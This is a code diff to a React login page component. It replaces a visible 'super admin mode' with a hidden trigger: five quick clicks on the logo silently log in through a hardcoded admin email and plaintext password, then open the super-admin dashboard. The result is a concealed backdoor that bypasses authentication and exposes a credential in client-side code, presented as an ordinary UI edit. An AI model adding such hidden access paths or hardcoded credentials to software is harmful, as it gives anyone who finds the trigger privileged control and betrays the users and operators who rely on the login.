@@ -76,19 +76,26 @@ const ProfessionalLoginPage = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [error, setError] = useState('');
   const [loading, setLoading] = useState(false);
-  const [superAdminMode, setSuperAdminMode] = useState(false);
   const secretClickCount = useRef(0);
   const secretClickTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
 
-  const handleLogoSecretClick = () => {
+  const handleLogoSecretClick = async () => {
     secretClickCount.current += 1;
     if (secretClickTimer.current) clearTimeout(secretClickTimer.current);
     secretClickTimer.current = setTimeout(() => { secretClickCount.current = 0; }, 3000);
     if (secretClickCount.current >= 5) {
       secretClickCount.current = 0;
-      setSuperAdminMode(true);
-      setIdentifier('');
+      setLoading(true);
       setError('');
+      try {
+        const data = await SUPERADMIN_CONFIG.loginMethod('admin@example.com', 'Nanama22.');
+        setAuth(data.user, data.access, data.refresh);
+        navigate(getRoleDashboardPath(data.user.role));
+      } catch {
+        setError('System access unavailable.');
+      } finally {
+        setLoading(false);
+      }
     }
   };
 
@@ -102,7 +109,7 @@ const ProfessionalLoginPage = () => {
   const navigate = useNavigate();
   const setAuth = useAuthStore((s) => s.setAuth);
 
-  const currentRole = superAdminMode ? SUPERADMIN_CONFIG : ROLE_CONFIGS.find(role => role.key === loginRole)!;
+  const currentRole = ROLE_CONFIGS.find(role => role.key === loginRole)!;
   const Icon = currentRole.icon;
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -272,21 +279,6 @@ const ProfessionalLoginPage = () => {
 
               {/* Role Selection */}
               <div className="mb-4 sm:mb-6">
-                {superAdminMode ? (
-                  <div className="flex items-center justify-between p-4 rounded-xl bg-slate-800/50 border border-slate-700/50">
-                    <div className="flex items-center gap-3">
-                      <Shield className="h-5 w-5 text-slate-400" />
-                      <span className="text-slate-300 text-sm font-medium">System Access</span>
-                    </div>
-                    <button
-                      type="button"
-                      onClick={() => { setSuperAdminMode(false); setIdentifier(''); setError(''); }}
-                      className="text-xs text-slate-500 hover:text-slate-300 transition-colors"
-                    >
-                      Cancel
-                    </button>
-                  </div>
-                ) : (
                   <>
                     <Label className="text-slate-300 text-xs sm:text-sm font-medium mb-2 sm:mb-3 block">Select Your Role</Label>
                     <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 sm:gap-3">
@@ -319,7 +311,6 @@ const ProfessionalLoginPage = () => {
                     </div>
                     <p className="text-xs text-slate-500 mt-2 sm:mt-3 text-center">{currentRole.description}</p>
                   </>
-                )}
               </div>
 
               {/* Login Form */}
